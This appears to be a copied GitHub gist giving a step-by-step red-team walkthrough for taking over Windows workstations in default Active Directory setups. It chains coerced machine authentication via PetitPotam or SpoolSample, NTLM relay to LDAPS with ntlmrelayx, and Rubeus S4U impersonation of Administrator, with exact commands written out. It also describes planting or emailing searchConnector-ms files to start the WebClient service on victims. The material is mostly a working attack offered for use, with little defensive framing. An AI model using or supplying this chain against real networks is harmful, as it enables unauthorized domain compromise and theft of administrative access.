From - https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb

## Overview

In the default configuration of Active Directory, it is possible to remotely take over Workstations (Windows 7/10/11) and possibly servers (if Desktop Experience is installed) when their WebClient service is running. This is accomplished in short by;

- Triggering machine authentication over HTTP via either MS-RPRN or MS-EFSRPC (as [demonstrated by @tifkin_](https://twitter.com/tifkin_/status/1418855927575302144?s=20)). This requires a set of credentials for the RPC call. 
- Relaying that machine authentication to LDAPS for configuring RBCD
- RBCD takeover

The caveat to this is that the WebClient service does not automatically start at boot. However, if the WebClient service has been triggered to start on a workstation (for example, via some SharePoint interactions), you can remotely take over that system. In addition, there are several ways to coerce the WebClient service to start remotely which I cover in a section below.

## RPC to RCE steps

1. To begin setup a relay to the LDAPS server for configuring RBCD. 

`ntlmrelayx.py -t ldaps://dc.windomain.local --delegate-access`
![NTLMRelayx.py](https://user-images.githubusercontent.com/46607768/126908959-4772e8ff-8ff5-4676-b7f9-39826cf5a1b3.png)

2. Attempt to trigger machine authentication over HTTP to your relay. This can be done via the publicly known RPC calls (and undoubtly various other unpublished ones)

`PetitPotam.exe logger@80/a.txt 192.168.38.104`
![PetitPotam](https://user-images.githubusercontent.com/46607768/126908997-a4c9ef39-dcf8-41a0-9278-292591804380.png)

OR

`SpoolSample.exe 192.168.38.104 logger@80/asdf`
![SpoolSample](https://user-images.githubusercontent.com/46607768/126909117-b09f50f2-f88a-48c6-9361-9237d4ecc104.png)

  Note for this critical step (remote machine authentication) to work;
  - The WebClient service needs to be running on the target (192.168.38.104 in this example). It may already be started on some workstations (worth trying to see if you get lucky) but if not see the next section. ***Update:*** [Lee Christensen has pointed out](https://twitter.com/tifkin_/status/1419806476353298442?s=20) that you can remotely enumerate this via the PowerShell command `Get-NTFile -Win32Path '\\target-ip\pipe\DAV RPC SERVICE'` which returns the named pipe if accessible. 
  - Your attacking host (`logger` in the case of my example) needs to be considered 'intranet' zoned by the target. One way to accomplish this is by using the netbios name of your attacking host (no periods). 
  - The URI syntax used above to coerce HTTP authentication (swapping in your attacking hostname).
  - LDAP signing/channel-binding must be disabled (this is the default).

3. If machine authentication is coerced, you should see a successful relay to LDAPS (assuming channel binding/signing is not enabled on the DC). This will result in the creation of a machine account for which RBCD is configured. If creating machine accounts is not possible, you can alternatively configure RBCD for a machine you have already compromised. 

![Successful Relay](https://user-images.githubusercontent.com/46607768/126909127-fb0711f0-f1eb-4e7c-9d14-0b92526aa87c.png)

4. From here, it's simply a matter of following the standard RBCD takeover methodology. I switched over to Rubeus, since my Linux host wasn't yet configured for Kerberos authentication but of course you can do this all from one host.

Calculate Password Hash:
`Rubeus.exe hash /password:NkQuBzsPk_AqKC6 /user:ZESLUQVX$ /domain:windomain.local`

Perform impersonation via S4U2Proxy:
`Rubeus.exe s4u /user:ZESLUQVX$ /rc4:D57DFD6E3BCDB1C2BF4D02CEE32F58C3 /impersonateuser:Administrator /msdsspn:cifs/WIN10.WINDOMAIN.LOCAL /ptt`

![S4U2proxy success](https://user-images.githubusercontent.com/46607768/126909145-793556e7-2960-4120-ac10-7133d4dfc9f2.png)

5. Enjoy your new workstation.

![Silver Ticket Use](https://user-images.githubusercontent.com/46607768/126909129-76c5858b-402e-4a1f-9cfe-402c59763e9a.png)

## Coercing the WebClient Service to Start

In my brief research/testing I found that a 'Search Connector' file could be used to start the WebClient service (as discussed/discovered by [@DTMSecurity](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) and [@domchell](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)). If you place said file locally, it will start the service locally (allowing for LPE) or you can place said file on an SMB share you have write access to. When a domain user browses that SMB share and views the 'searchConnector-ms' file you planted, the WebClient service will start on their workstation, and you can proceed with step 2 above. Of course you can also attempt NTLM relay of the user authentication, but our discussion/goal here is simply to have the WebClient started to enable machine takeover.

**Before:**
![WebClient Stopped](https://user-images.githubusercontent.com/46607768/126909134-d745f149-1fde-4b5b-81f3-f3e206e7bf0f.png)

**Creating the SearchConnector-ms File:**
![SearchConnector](https://user-images.githubusercontent.com/46607768/126909138-0c91612f-6743-491b-9a88-cb88006b2b09.png)

**After:**

![WebClient Running](https://user-images.githubusercontent.com/46607768/126909124-1d6dfcaa-ffb1-4557-ba49-3d91acee990b.png)

You can set the HTTP target as your attacker host so you know which workstation has had the WebClient started.

As an alternative approach (albeit less stealthy), you can email your target a 'Search Connector' file. If a user attempts to open the file, the WebClient service will start on their workstation. 
